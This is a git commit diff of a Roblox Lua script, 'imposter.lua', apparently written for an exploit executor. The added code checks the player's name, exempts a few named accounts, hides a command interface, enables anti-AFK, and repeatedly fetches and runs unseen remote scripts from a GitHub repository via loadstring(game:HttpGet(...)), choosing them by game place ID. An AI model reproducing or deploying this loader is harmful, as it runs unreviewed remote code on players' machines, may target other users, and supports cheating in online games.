03e82dd681009c505bbde594d5e1e0af088b945a
Junniebug <87003782+Junniebug@users.noreply.github.com>
2021-07-31 23:29:10 +0900

    Update imposter.lua

--- imposter.lua
+++ imposter.lua
@@ -1,10 +1,20 @@
+
+
+    spawn(function()
+if game['PlaceId'] == 2809202155 then return end
+
+game.Loaded:Wait()
+
+local lp = game:GetService('Players').LocalPlayer
+
+if lp.Name ~= "sjlyant" then
+	if lp.Name == "Juneuari" then return end
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/sussybaka.lua'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/babft.lua'))()
 execCmd('hideiy')
 execCmd('antiafk')
-wait()
+            
 getgenv().ws = false
-
+            
 local function sus()
     if ws == true then
  -- loadstring(game:HttpGet("https://pastebin.com/raw/UwFCVrhS", true))() someone else's pastebin
@@ -15,4 +25,22 @@ end
 
 game.Players.LocalPlayer.CharacterAdded:Connect(sus)
 sus()
+    end)
+
+spawn(function()
+if game['PlaceId'] == 3978370137 then  -- gpo
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/fh.lua'))()
+elseif game['PlaceId'] == 6360478118 then -- gpo universe hub
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/fh.lua'))()
+elseif game['PlaceId'] == 1730877806 then -- gpo main hub
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/fh.lua'))()
+elseif game['PlaceId'] == 2809202155 then -- yba
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/fh.lua'))()
+elseif game['PlaceId'] == 5094651510 then -- demonfall
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/fh.lua'))()
+end
+        game.Loaded:Wait()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/babft.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/demonfall.lua'))()
+end)
     
